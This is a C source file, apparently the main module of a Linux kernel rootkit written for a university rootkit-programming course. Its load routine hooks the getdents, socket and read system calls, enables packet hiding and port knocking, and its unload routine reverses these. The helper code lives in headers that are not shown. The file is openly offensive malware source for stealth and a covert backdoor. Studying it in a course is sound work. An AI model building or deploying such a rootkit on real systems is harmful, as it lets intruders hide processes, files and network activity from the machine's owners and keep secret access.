/*
 * Rootkit for the course Rootkit Programming at TUM in WS2014/15.
 * Implemented by Guru Chandrasekhara and Martin Herrmann.
 */
#include <linux/kernel.h>

#include "control.h"
#include "getdents.h"
#include "hide_packet.h"
#include "hide_socket.h"
#include "include.h"
#include "main.h"
#include "port_knocking.h"
#include "read.h"
#include "hide_module.h"

/*
 * Function called when loading the kernel module.
 * Prints a welcome-message and then does its magic.
 */
int init_module (void)
{
	int ret;

	ROOTKIT_DEBUG("****************************************\n");	
	ROOTKIT_DEBUG("Beginning rootkit loading procedure...\n");
	ROOTKIT_DEBUG("****************************************\n");	

	// TODO: change all these functions from void to int to relay success/failure
	// TODO: remove as many parameters from the load functions as possible
	// TODO: only load what is absolutely necessary for the rootkit to function at insertion
	
	initialize_control();
	hook_getdents();	
	hook_sockets();
	hook_read();
	load_packet_hiding();
	
	/* load port knocking */
	ret = load_port_knocking();	
	if(ret < 0) {
		ROOTKIT_DEBUG("Error while loading port knocking! Aborting insertion.\n");
		return ret;
	}

	ROOTKIT_DEBUG("****************************************\n");	
	ROOTKIT_DEBUG("Loading was successful!\n");
	ROOTKIT_DEBUG("****************************************\n");	
	return 0;
}

/*
 * Function called when unloading the kernel module.
 * Prints a goodbye-message and restores the kernel to its
 * original form.
 */
void cleanup_module (void)
{
	ROOTKIT_DEBUG("****************************************\n");	
	ROOTKIT_DEBUG("Beginning rootkit unloading procedure...\n");
	ROOTKIT_DEBUG("****************************************\n");	

	// TODO: adapt all unload functions to only do something if they are loaded
	

	unload_packet_hiding();
	unhook_getdents();
	unhook_sockets();
	unhook_read();
	unhook_modules();
	unload_port_knocking();
	cleanup_control();
	
	/* Finally, log the unloading */
	ROOTKIT_DEBUG("****************************************\n");	
	ROOTKIT_DEBUG("Unloading was successful. Bye!\n");
	ROOTKIT_DEBUG("****************************************\n");	
}
